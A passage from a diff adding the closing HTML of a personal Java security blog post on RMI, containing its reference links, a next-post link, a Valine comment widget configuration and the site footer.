+<li>https://javasec.org/javase/RMI/</li>
+<li>https://su18.org/post/rmi-attack/</li>
+<li>p牛java漫谈</li>
+</ul>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/java-agent-xue-xi/" class="post-title gt-a-link">
+                    JavaSec-Agent
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/javasec-rmi/" class="leancloud_visitors" data-flag-title="JavaSec-RMI">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
